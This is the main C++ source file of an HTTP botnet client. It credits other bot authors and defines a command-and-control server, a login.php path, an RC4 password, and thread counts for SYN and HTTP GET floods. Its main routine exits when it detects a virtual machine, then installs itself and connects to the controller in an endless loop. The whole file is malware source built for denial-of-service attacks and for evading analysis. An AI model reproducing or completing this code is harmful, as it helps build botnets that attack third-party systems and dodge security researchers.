//#define DEBUG
/*-----------------------Creditz--------------------------
-RadiatioN (for "Http Bots - the new state of the art")
-h1t3m (for the antis (tooked them out of ri0t 5))
-the people who made the RC4 codes i use
-MSDN [i never find where it explains the api´s but is explains good]*/
#include "headers.h"
//#include "optimize.h"
/*###########################################################################################*/
/*##############################HERE BEGINS THE CONFIG PART##################################*/
/*###########################################################################################*/
string server="localhost";	
string loginlocation="bot/login.php";//location of login php
string cryptpassword="password";
int commandcount=0;
int BotID=0;
#define BufferGroesse 2048
#define SKYSYN_SOCKETS 100
#define GETFLOOD_THREADS 200
#define SKYSYN_THREADS 200
#define OneMinute 60000
/*###########################################################################################*/
/*################################HERE ENDS THE CONFIG PART##################################*/
/*###########################################################################################*/
#include "botfunctions.h"

//#if defined DEBUG
  int main(){
//#else
//  WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){
//#endif
	srand(GetTickCount());
	int delay=rand()%600+2;
	if(IsInVM()){
		return 1;}
	//AntiTaskManager(); 
    install();
	WSADATA wsadata;  
    int startup=WSAStartup(MAKEWORD(2,2), &wsadata);
    #if defined DEBUG
      cout<<"now connecting";
    #endif
    int reply=0;
    while (1)
  	  reply=connect(reply);		
    return 0;
}
